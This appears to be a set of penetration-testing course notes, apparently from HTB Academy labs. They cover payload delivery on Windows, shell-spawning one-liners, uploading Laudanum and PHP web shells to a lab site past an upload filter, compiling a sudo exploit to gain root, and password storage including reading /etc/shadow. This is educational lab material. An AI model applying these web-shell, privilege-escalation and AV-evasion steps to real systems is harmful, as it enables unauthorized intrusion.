    <p><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library">DLLs</a> A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.</p>
  </li>
  <li>
    <p><a href="https://commandwindows.com/batch.htm">Batch</a> Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of <code class="language-plaintext highlighter-rouge">.bat</code>. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.</p>
  </li>
  <li>
    <p><a href="https://www.guru99.com/introduction-to-vbscript.html">VBS</a> VBScript is a lightweight scripting language based on Microsoft’s Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.</p>
  </li>
  <li>
    <p><a href="https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions">MSI</a> <code class="language-plaintext highlighter-rouge">.MSI</code> files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run <code class="language-plaintext highlighter-rouge">msiexec</code> to execute our file, which will provide us with further access, such as an elevated reverse shell.</p>
  </li>
  <li>
    <p><a href="https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1">Powershell</a> Powershell is both a shell environment and scripting language. It serves as Microsoft’s modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.</p>
  </li>
</ul>

<p>Now that we understand what each type of Windows file can be used for let’s discuss some basic tools, tactics, and procedures for building our payloads and delivering them onto the host to land a shell.</p>

<h4 id="payload-generation">Payload Generation</h4>

<p>We have plenty of good options for dealing with generating payloads to use against Windows hosts. We touched on some of these already in previous sections. For example, the Metasploit-Framework and MSFVenom is a very handy way to generate payloads since it is OS agnostic. The table below lays out some of our options. However, this is not an exhaustive list, and new resources come out daily.</p>

<p>| <strong>Resource</strong>                      | <strong>Description</strong>                                                                                                                                                                                                                                                                                                   |
| ——————————— | —————————————————————————————————————————————————————————————————————————————————————————————————————– |
| <code class="language-plaintext highlighter-rouge">MSFVenom &amp; Metasploit-Framework</code> | <a href="https://github.com/rapid7/metasploit-framework">Source</a> MSF is an extremely versatile tool for any pentester’s toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
| <code class="language-plaintext highlighter-rouge">Payloads All The Things</code>         | <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">Source</a> Here, you can find many different resources and cheat sheets for payload generation and general methodology.                                                                                                                                        |
| <code class="language-plaintext highlighter-rouge">Mythic C2 Framework</code>             | <a href="https://github.com/its-a-feature/Mythic">Source</a> The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.                                                                                                                    |
| <code class="language-plaintext highlighter-rouge">Nishang</code>                         | <a href="https://github.com/samratashok/nishang">Source</a> Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.                                                                                                                  |
| <code class="language-plaintext highlighter-rouge">Darkarmour</code>                      | <a href="https://github.com/bats3c/darkarmour">Source</a> Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.                                                                                                                                                                    |</p>
<h4 id="payload-transfer-and-execution">Payload Transfer and Execution:</h4>

<p>Besides the vectors of web-drive-by, phishing emails, or dead drops, Windows hosts can provide us with several other avenues of payload delivery. The list below includes some helpful tools and protocols for use while attempting to drop a payload on a target.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Impacket</code>: <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with <code class="language-plaintext highlighter-rouge">psexec</code>, <code class="language-plaintext highlighter-rouge">smbclient</code>, <code class="language-plaintext highlighter-rouge">wmi</code>, Kerberos, and the ability to stand up an SMB server.</li>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md">Payloads All The Things</a>: is a great resource to find quick oneliners to help transfer files across hosts expediently.</li>
  <li><code class="language-plaintext highlighter-rouge">SMB</code>: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.</li>
  <li><code class="language-plaintext highlighter-rouge">Remote execution via MSF</code>: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.</li>
  <li><code class="language-plaintext highlighter-rouge">Other Protocols</code>: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.</li>
</ul>

<hr />

<h1 id="spawning-interactive-shells">Spawning Interactive Shells</h1>

<p>At the end of the last section, we established a shell session with the target. Initially, our shell was limited (sometimes referred to as a jail shell), so we used python to spawn a TTY bourne shell to give us access to more commands and a prompt to work from. This will likely be a situation we find ourselves in more and more as we practice on Hack The Box and in the real world on engagements.</p>

<p>There may be times that we land on a system with a limited shell, and Python is not installed. In these cases, it’s good to know that we could use several different methods to spawn an interactive shell. Let’s examine some of them.</p>

<p>Know that whenever we see <code class="language-plaintext highlighter-rouge">/bin/sh</code> or <code class="language-plaintext highlighter-rouge">/bin/bash</code>, this could also be replaced with the binary associated with the shell interpreter language present on that system. With most Linux systems, we will likely come across <code class="language-plaintext highlighter-rouge">bourne shell</code> (<code class="language-plaintext highlighter-rouge">/bin/sh</code>) and <code class="language-plaintext highlighter-rouge">bourne again shell</code> (<code class="language-plaintext highlighter-rouge">/bin/bash</code>) present on the system natively.</p>

<h3 id="binsh--i">/bin/sh -i</h3>

<p>This command will execute the shell interpreter specified in the path in interactive mode (<code class="language-plaintext highlighter-rouge">-i</code>).</p>

<h4 id="interactive">Interactive</h4>

<p>Spawning Interactive Shells</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/sh <span class="nt">-i</span>
sh: no job control <span class="k">in </span>this shell
sh-4.2<span class="err">$</span>
</code></pre></div></div>

<h2 id="perl">Perl</h2>

<p>If the programming language <a href="https://www.perl.org">Perl</a> is present on the system, these commands will execute the shell interpreter specified.</p>

<h4 id="perl-to-shell">Perl To Shell</h4>

<p>Spawning Interactive Shells</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl —e <span class="s1">'exec "/bin/sh";'</span>
</code></pre></div></div>

<h2 id="ruby">Ruby</h2>

<p>If the programming language <a href="https://www.ruby-lang.org/en/">Ruby</a> is present on the system, this command will execute the shell interpreter specified:</p>

<h4 id="ruby-to-shell">Ruby To Shell</h4>

<p>Spawning Interactive Shells</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby: <span class="nb">exec</span> <span class="s2">"/bin/sh"</span>
</code></pre></div></div>

<p>If the programming language <a href="https://www.lua.org">Lua</a> is present on the system, we can use the <code class="language-plaintext highlighter-rouge">os.execute</code> method to execute the shell interpreter specified using the full command below:</p>

<h4 id="lua-to-shell">Lua To Shell</h4>

<p>Spawning Interactive Shells</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lua: os.execute<span class="o">(</span><span class="s1">'/bin/sh'</span><span class="o">)</span>
</code></pre></div></div>
<h2 id="awk">AWK</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">awk</span> <span class="s1">'BEGIN {system("/bin/sh")}'</span>
</code></pre></div></div>

<h2 id="find">Find</h2>

<p><a href="https://man7.org/linux/man-pages/man1/find.1.html">Find</a> is a command present on most Unix/Linux systems widely used to search for &amp; through files and directories using various criteria. It can also be used to execute applications and invoke a shell interpreter.</p>

<h4 id="using-find-for-a-shell">Using Find For A Shell</h4>

<p>Spawning Interactive Shells</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-name</span> nameoffile <span class="nt">-exec</span> /bin/awk <span class="s1">'BEGIN {system("/bin/sh")}'</span> <span class="se">\;</span>
</code></pre></div></div>

<h2 id="vim">VIM</h2>

<p>Yes, we can set the shell interpreter language from within the popular command-line-based text-editor <code class="language-plaintext highlighter-rouge">VIM</code>. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.</p>

<h4 id="vim-to-shell">Vim To Shell</h4>

<p>Spawning Interactive Shells</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim <span class="nt">-c</span> <span class="s1">':!/bin/sh'</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim
:set <span class="nv">shell</span><span class="o">=</span>/bin/sh
:shell
</code></pre></div></div>

<h4 id="sudo--l">Sudo -l</h4>

<p>Spawning Interactive Shells</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>apache on ILF-WebSrv:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User apache may run the following commands on ILF-WebSrv:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: ALL
</code></pre></div></div>

<hr />

<h1 id="laudanum-one-webshell-to-rule-them-all">Laudanum, One Webshell to Rule Them All</h1>

<p>Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include <code class="language-plaintext highlighter-rouge">asp, aspx, jsp, php,</code> and more. This is a staple to have on any pentest. If you are using your own VM, Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use. You can get it <a href="https://github.com/jbarcia/Web-Shells/tree/master/laudanum">here</a>. Let’s examine Laudanum and see how it works.</p>

<h2 id="working-with-laudanum">Working with Laudanum</h2>

<p>The Laudanum files can be found in the <code class="language-plaintext highlighter-rouge">/usr/share/laudanum</code> directory. For most of the files within Laudanum, you can copy them as-is and place them where you need them on the victim to run. For specific files such as the shells, you must edit the file first to insert your <code class="language-plaintext highlighter-rouge">attacking</code> host IP address to ensure you can access the web shell or receive a callback in the instance that you use a reverse shell. Before using the different files, be sure to read the contents and comments to ensure you take the proper actions.</p>

<h2 id="laudanum-demonstration">Laudanum Demonstration</h2>

<p>Now that we understand what Laudanum is and how it works, let’s look at a web application we have found in our lab environment and see if we can run a web shell. If you wish to follow along with this demonstration, you will need to add an entry into your <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file on your attack VM or within Pwnbox for the host we are attacking. That entry should read: <code class="language-plaintext highlighter-rouge">&lt;target ip&gt; status.inlanefreight.local</code>. Once this is done, you can play and explore this demonstration as long as you are on the VPN or using Pwnbox.</p>

<h4 id="move-a-copy-for-modification">Move a Copy for Modification</h4>

<p>Laudanum, One Webshell to Rule Them All</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="nb">cp</span> /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
</code></pre></div></div>

<p>Add your IP address to the <code class="language-plaintext highlighter-rouge">allowedIps</code> variable on line <code class="language-plaintext highlighter-rouge">59</code>. Make any other changes you wish. It can be prudent to remove the ASCII art and comments from the file. These items in a payload are often signatured on and can alert the defenders/AV to what you are doing.</p>

<h4 id="modify-the-shell-for-use">Modify the Shell for Use</h4>

<p><img src="https://academy.hackthebox.com/storage/modules/115/modify-shell.png" alt="The image shows a code snippet in a text editor. It highlights an array of allowed IP addresses, including &quot;10.10.14.12&quot;. A yellow arrow points to this line, indicating its significance." /></p>

<p>We are taking advantage of the upload function at the bottom of the status page(<code class="language-plaintext highlighter-rouge">Green Arrow</code>) for this to work. Select your shell file and hit upload. If successful, it should print out the path to where the file was saved (Yellow Arrow). Use the upload function. Success prints out where the file went, navigate to it.</p>

<h4 id="take-advantage-of-the-upload-function">Take Advantage of the Upload Function</h4>

<p><img src="https://academy.hackthebox.com/storage/modules/115/laud-upload.png" alt="The image shows a server status page with BIOS, disk, and services information. Several services are marked as &quot;Stopped&quot; in red. A section for importing configuration files is highlighted with a yellow arrow pointing to the file path and a green arrow pointing to the &quot;Upload File&quot; button." /></p>

<p>Once the upload is successful, you will need to navigate to your web shell to utilize its functions. The image below shows us how to do it. As seen from the last image, our shell was uploaded to the <code class="language-plaintext highlighter-rouge">\\files\</code> directory, and the name was kept the same. This won’t always be the case. You may run into some implementations that randomize filenames on upload that do not have a public files directory or any number of other potential safeguards. For now, we are lucky that’s not the case. With this particular web application, our file went to <code class="language-plaintext highlighter-rouge">status.inlanefreight.local\\files\demo.aspx</code> and will require us to browse for the upload by using that \ in the path instead of the / like normal. Once you do this, your browser will clean it up in your URL window to appear as <code class="language-plaintext highlighter-rouge">status.inlanefreight.local//files/demo.aspx</code>.</p>

<h4 id="navigate-to-our-shell">Navigate to Our Shell</h4>

<p><img src="https://academy.hackthebox.com/storage/modules/115/laud-nav.png" alt="The image shows a Laundanum ASPX Shell interface with a command input field labeled &quot;cmd /c&quot; and a &quot;Submit Query&quot; button. A green arrow points to the URL &quot;status.inlanefreight.local/files/demo.aspx&quot; in the browser's address bar." /></p>

<p>We can now utilize the Laudanum shell we uploaded to issue commands to the host. We can see in the example that the <code class="language-plaintext highlighter-rouge">systeminfo</code> command was run.</p>

<h4 id="shell-success">Shell Success</h4>

<p><img src="https://academy.hackthebox.com/storage/modules/115/laud-success.png" alt="The image shows a Laundanum ASPX Shell interface displaying system information. It includes details like host name, OS version, manufacturer, system type, processor, memory, and network card information. The command &quot;systeminfo&quot; is executed, and the output is shown under &quot;STDOUT&quot; in the browser window." /></p>

<h2 id="aspx-and-a-quick-learning-tip">ASPX and a Quick Learning Tip</h2>

<p>Before diving into aspx shell concepts and exercises, we should take the time to cover a learning resource that can help reinforce most of the concepts covered here in HTB Academy. Occasionally it can be a challenge to visualize a concept using just one learning method. It is good to supplement reading with watching demonstrations and performing hands-on as we have been doing thus far. Video walkthroughs can be an amazing way to learn concepts, plus they can be consumed casually (eating lunch, laying in bed, sitting on the couch, etc.). One great resource to use in learning is <code class="language-plaintext highlighter-rouge">IPPSEC's</code> blog site <a href="https://ippsec.rocks/?#">ippsec.rocks</a>. The site is a powerful learning tool. Take, for example, the concept of web shells. We can use his site to type in the concept we want to learn, like aspx.![[IPPSEC.png]]</p>

<h2 id="aspx-explained">ASPX Explained</h2>

<p><code class="language-plaintext highlighter-rouge">Active Server Page Extended</code> (<code class="language-plaintext highlighter-rouge">ASPX</code>) is a file type/extension written for <a href="https://docs.microsoft.com/en-us/aspnet/overview">Microsoft’s ASP.NET Framework</a>. On a web server running the ASP.NET framework, web form pages can be generated for users to input data. On the server side, the information will be converted into HTML. We can take advantage of this by using an ASPX-based web shell to control the underlying Windows operating system. Let’s witness this first-hand by utilizing the Antak Webshell.</p>

<p>Antak is a web shell built-in ASP.Net included within the <a href="https://github.com/samratashok/nishang">Nishang project</a>. Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest. Since we are focused on web applications for the moment, let’s keep our eyes on <code class="language-plaintext highlighter-rouge">Antak</code>. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server. The UI is even themed like PowerShell. It’s time to dive in and experiment with Antak.</p>

<h1 id="php-web-shells">PHP Web Shells</h1>

<hr />

<p>Hypertext Preprocessor or <a href="https://www.php.net">PHP</a> is an open-source general-purpose scripting language typically used as part of a web stack that powers a website. At the time of this writing (October 2021), PHP is the most popular <code class="language-plaintext highlighter-rouge">server-side programming language</code>. According to a <a href="https://w3techs.com/technologies/details/pl-php">recent survey</a> conducted by W3Techs, “PHP is used by <code class="language-plaintext highlighter-rouge">78.6%</code> of all websites whose server-side programming language we know”.</p>

<p>Let’s consider a practical example of filling out the user account and password fields on a login web form.</p>

<p>We will be using <a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell">WhiteWinterWolf’s PHP Web Shell</a>. We can download this or copy and paste the source code into a <code class="language-plaintext highlighter-rouge">.php</code> file. Keep in mind that the file type is significant, as we will soon witness. Our goal is to upload the PHP web shell via the Vendor Logo <code class="language-plaintext highlighter-rouge">browse</code> button. Attempting to do this initially will fail since rConfig is checking for the file type. It will only allow uploading image file types (.png,.jpg,.gif, etc.). However, we can bypass this utilizing <code class="language-plaintext highlighter-rouge">Burp Suite</code>.</p>

<p>Start Burp Suite, navigate to the browser’s network settings menu and fill out the proxy settings. <code class="language-plaintext highlighter-rouge">127.0.0.1</code> will go in the IP address field, and <code class="language-plaintext highlighter-rouge">8080</code> will go in the port field to ensure all requests pass through Burp (recall that Burp acts as the web proxy).</p>

<hr />

<h2 id="mastering-binaries-with-dockers">Mastering binaries with Dockers</h2>

<p>Question: The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">--version</span>  
Sudo version 1.8.31
</code></pre></div></div>

<h6 id="with-some-basic-cultur">With some basic cultur</h6>

<p>Finding this on Google it says there’s a promising C code for doing alteration of sudo with <code class="language-plaintext highlighter-rouge">sudoedit</code>.
All research credit: <strong>Qualys Research Team</strong> Check out the details on their <a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">blog</a>.</p>

<p>You can check your version of sudo is vulnerable with: <code class="language-plaintext highlighter-rouge">$ sudoedit -s Y</code>. If it asks for your password it’s most likely vulnerable, if it prints usage information it isn’t. You can downgrade to the vulnerable version on Ubuntu 20.04 for testing purposes with <code class="language-plaintext highlighter-rouge">$ sudo apt install sudo=1.8.31-1ubuntu1</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usege  `make &amp;&amp; ./exploit`
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb:/htb-&gt;<span class="nv">$ </span>./e

./e: /lib/x86_64-linux-gnu/libc.so.6: version <span class="sb">`</span>GLIBC_2.34<span class="s1">' not found (required by ./e)
</span></code></pre></div></div>

<p>Now the problem seems about compilation and as you can see it’s using GLIBC 2.34 and the vulnerable version of it is the 2.31 version..</p>

<p>so buildind a docker with this we can easily recompile in docker itself with this <code class="language-plaintext highlighter-rouge">Dockerfile</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FROM ubuntu:20.04  
  
RUN apt update <span class="o">&amp;&amp;</span> apt <span class="nb">install</span> <span class="nt">-y</span> build-essential <span class="o">&amp;&amp;</span>  apt <span class="nb">install</span> <span class="nt">-y</span> git
</code></pre></div></div>

<p>so now compiling with the right libc version make the exploit works</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit
<span class="nb">id  
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<hr />

<h1 id="password-attacks">Password Attacks</h1>

<p><code class="language-plaintext highlighter-rouge">Confidentiality</code>, <code class="language-plaintext highlighter-rouge">Integrity</code>, and <code class="language-plaintext highlighter-rouge">Availability</code> are at the heart of every Infosec practitioner’s role. Without maintaining a balance between them, we cannot ensure the safety and security of our enterprises. We keep this balance by ensuring we audit and account (Accounting) for each file, object, and host in our environment; by validating users have correct permissions (Authorization) to view and utilize those items; and ensuring that each user’s identity is validated (Authentication) before granting them access to any enterprise resources. Most breaches can be tied back to losing one of those three tenets. This module will focus on attacking and bypassing the tenet of <code class="language-plaintext highlighter-rouge">Authentication</code> by compromising user passwords in many different operating systems, applications, and encryption types. Let’s take a second to discuss authentication and its components in a bit more detail before diving into the exciting part, <code class="language-plaintext highlighter-rouge">attacking passwords</code>.
Authentication, at its core, is the validation of your identity by presenting a combination of three main factors to a validation mechanism. They are;</p>

<ol>
  <li>Something you know (a password, passcode, pin, etc.).</li>
  <li>Something you have (an ID Card, security key, or other MFA tools).</li>
  <li>Something you are (your physical self, username, email address, or other identifiers.)</li>
</ol>

<p>The process can require any or all of these authentication descriptors. These methods will be determined based on the severity of the information or systems accessed and how much protection they need. For example, doctors are often required to utilize a Common Access Card (CAC) paired with a pin-code or password to access any terminals that input or store patient data. Depending on the maturity of the organization’s security posture, they could require all three types (A CAC, password, and pin from an authenticator app, for example).</p>

<p>Another simple example of this is access to our email address. The proof of information, in this case, would be the knowledge of the email address itself and the associated password. For example, a cell phone with <code class="language-plaintext highlighter-rouge">2FA</code> can be used. The third aspect can also play a role: the user’s presence through biometric recognition such as a fingerprint or facial recognition.</p>

<p>In the previous example, the password is the authentication identifier that can be bypassed with different TTPs. This level is about authenticating the identity. Usually, only the owner and authenticating authority know the password. Authorization is carried out if the correct password is given to the authentication authority. Authorization, in this case, is the set of permissions that the user is granted upon successful login.</p>

<hr />

<h6 id="the-use-of-passwords">The Use of Passwords</h6>

<p>The most common and widely used authentication method is still the use of passwords, but what is a password? A password or passphrase can be generally defined as <code class="language-plaintext highlighter-rouge">a combination of letters, numbers, and symbols in a string for identity validation.</code> For example, if we work with passwords and take a standard 8-digit password that consists only of upper case letters and numbers, we would get a total of <code class="language-plaintext highlighter-rouge">36⁸</code> (<code class="language-plaintext highlighter-rouge">208,827,064,576</code>) different combinations of passwords.</p>

<p>Realistically, it doesn’t need to be a combination of those things. It could be a lyric from a song or poem, a line from a book, a phrase you can remember, or even randomly generated words concatenated together like “TreeDogEvilElephant.” The key is for it to meet or exceed the security standards in place by your organization. Using multiple layers to establish identity can make the entire authentication process complicated and costly. Adding complexity to the authentication process creates further effort that can add to the stresses and workload a person may have during a typical workday. Complex systems can often require inconvenient manual processes or additional steps that could significantly complicate the interaction and <code class="language-plaintext highlighter-rouge">user experience</code> (<code class="language-plaintext highlighter-rouge">UX</code>). Consider the process of shopping at an online store. Creating an account on the store website can make the authentication and checkout processes much faster than manually inputting your personal information each time you wish to make a purchase. For this reason, using a username and password to secure an account is the most widespread method of authentication that we will see again and again while keeping in mind this balance of convenience and security.</p>

<p>PandaSecurity has compiled <a href="https://www.pandasecurity.com/en/mediacenter/tips/password-statistics/">statistics</a> on various aspects of passwords that give us a good overview of how and in what way passwords are used worldwide. Of interest to us would be the entry describing <code class="language-plaintext highlighter-rouge">24% of Americans</code> have used passwords like <code class="language-plaintext highlighter-rouge">password</code>, <code class="language-plaintext highlighter-rouge">Qwerty</code>, or <code class="language-plaintext highlighter-rouge">123456</code>. So, in theory, we could successfully compromise systems using these three passwords at many different organizations due to their widespread use.</p>

<p>One aspect of this statistic that is somewhat more difficult to understand is that only 45% of Americans would change their passwords after a data breach. This, in turn, means that <code class="language-plaintext highlighter-rouge">55% still keep the password</code> even though it has already been leaked. We can also check if one of our email addresses is affected by various data breaches. One of the best-known sources for this is <a href="https://haveibeenpwned.com/">HaveIBeenPwned</a>. We enter an email address in the HaveIBeenPwned website, and it checks in its database if the email address has already been affected by any reported data breaches. If this is the case, we will see a list of all of the breaches in which our email address appears.</p>

<h4 id="credential-storage">Credential Storage</h4>

<h5 id="linux">Linux</h5>

<p>As we already know, Linux-based systems handle everything in the form of a file. Accordingly, passwords are also stored encrypted in a file. This file is called the <code class="language-plaintext highlighter-rouge">shadow</code> file and is located in <code class="language-plaintext highlighter-rouge">/etc/shadow</code> and is part of the Linux user management system. In addition, these passwords are commonly stored in the form of <code class="language-plaintext highlighter-rouge">hashes</code>. An example can look like this:</p>

<p>Credential Storage</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@htb:~#</span><span class="w"> </span><span class="nb">cat</span> /etc/shadow
<span class="go">
...SNIP...
</span><span class="gp">htb-student:$</span>y<span class="nv">$j9T$3QSBB6CbHEu</span>...SNIP...f8Ms:18955:0:99999:7:::
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file has a unique format in which the entries are entered and saved when new users are created.</p>

<p>| <strong>ID</strong>   | <strong>Cryptographic Hash Algorithm</strong>                                      |
| ——– | ——————————————————————— |
| <code class="language-plaintext highlighter-rouge">$1$</code>    | <a href="https://en.wikipedia.org/wiki/MD5">MD5</a>                              |
| <code class="language-plaintext highlighter-rouge">$2a$</code>   | <a href="https://en.wikipedia.org/wiki/Blowfish_\(cipher\)">Blowfish</a>         |
| <code class="language-plaintext highlighter-rouge">$5$</code>    | <a href="https://en.wikipedia.org/wiki/SHA-2">SHA-256</a>                        |
| <code class="language-plaintext highlighter-rouge">$6$</code>    | <a href="https://en.wikipedia.org/wiki/SHA-2">SHA-512</a>                        |
| <code class="language-plaintext highlighter-rouge">$sha1$</code> | <a href="https://en.wikipedia.org/wiki/SHA-1">SHA1crypt</a>                      |
| <code class="language-plaintext highlighter-rouge">$y$</code>    | <a href="https://github.com/openwall/yescrypt">Yescrypt</a>                      |
| <code class="language-plaintext highlighter-rouge">$gy$</code>   | <a href="https://www.openwall.com/lists/yescrypt/2019/06/30/1">Gost-yescrypt</a> |
| <code class="language-plaintext highlighter-rouge">$7$</code>    | <a href="https://en.wikipedia.org/wiki/Scrypt">Scrypt</a>                        |
However, a few more files belong to the user management system of Linux. The other two files are <code class="language-plaintext highlighter-rouge">/etc/passwd</code> and <code class="language-plaintext highlighter-rouge">/etc/group</code>. In the past, the encrypted password was stored together with the username in the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, but this was increasingly recognized as a security problem because the file can be viewed by all users on the system and must be readable. The <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file can only be read by the user <code class="language-plaintext highlighter-rouge">root</code>.</p>

<h4 id="windows-authentication-process">Windows Authentication Process</h4>

<p>The <a href="https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication">Windows client authentication process</a> can oftentimes be more complicated than with Linux systems and consists of many different modules that perform the entire logon, retrieval, and verification processes. In addition, there are many different and complex authentication procedures on the Windows system, such as Kerberos authentication. The <a href="https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection">Local Security Authority</a> (<code class="language-plaintext highlighter-rouge">LSA</code>) is a protected subsystem that authenticates users and logs them into the local computer. In addition, the LSA maintains information about all aspects of local security on a computer. It also provides various services for translating between names and security IDs (<code class="language-plaintext highlighter-rouge">SIDs</code>).</p>

<p>The security subsystem keeps track of the security policies and accounts that reside on a computer system. In the case of a Domain Controller, these policies and accounts apply to the domain where the Domain Controller is located. These policies and accounts are stored in Active Directory. In addition, the LSA subsystem provides services for checking access to objects, checking user permissions, and generating monitoring messages.</p>

<h6 id="windows-authentication-process-diagram">Windows Authentication Process Diagram</h6>

<p><img src="https://academy.hackthebox.com/storage/modules/147/Auth_process1.png" alt="Diagram of Windows Authentication Process showing interactions between WinLogon.exe, LogonUI, lsass.exe, and authentication packages like NTLM and Kerberos." /></p>

<p>Local interactive logon is performed by the interaction between the logon process (<a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2228450&amp;seqNum=8">WinLogon</a>), the logon user interface process (<code class="language-plaintext highlighter-rouge">LogonUI</code>), the <code class="language-plaintext highlighter-rouge">credential providers</code>, <code class="language-plaintext highlighter-rouge">LSASS</code>, one or more <code class="language-plaintext highlighter-rouge">authentication packages</code>, and <code class="language-plaintext highlighter-rouge">SAM</code> or <code class="language-plaintext highlighter-rouge">Active Directory</code>. Authentication packages, in this case, are the Dynamic-Link Libraries (<code class="language-plaintext highlighter-rouge">DLLs</code>) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package <code class="language-plaintext highlighter-rouge">Msv1_0.dll</code> is used.</p>

<p><code class="language-plaintext highlighter-rouge">Winlogon</code> is a trusted process responsible for managing security-related user interactions. These include:</p>

<ul>
  <li>
    <p>Launching LogonUI to enter passwords at login</p>
  </li>
  <li>
    <p>Changing passwords</p>
  </li>
  <li>
    <p>Locking and unlocking the workstation</p>
  </li>
</ul>

<p>It relies on credential providers installed on the system to obtain a user’s account name or password. Credential providers are <code class="language-plaintext highlighter-rouge">COM</code> objects that are located in DLLs.</p>

<p>Winlogon is the only process that intercepts login requests from the keyboard sent via an RPC message from Win32k.sys. Winlogon immediately launches the LogonUI application at logon to display the user interface for logon. After Winlogon obtains a user name and password from the credential providers, it calls LSASS to authenticate the user attempting to log in.</p>

<h6 id="lsass">LSASS</h6>

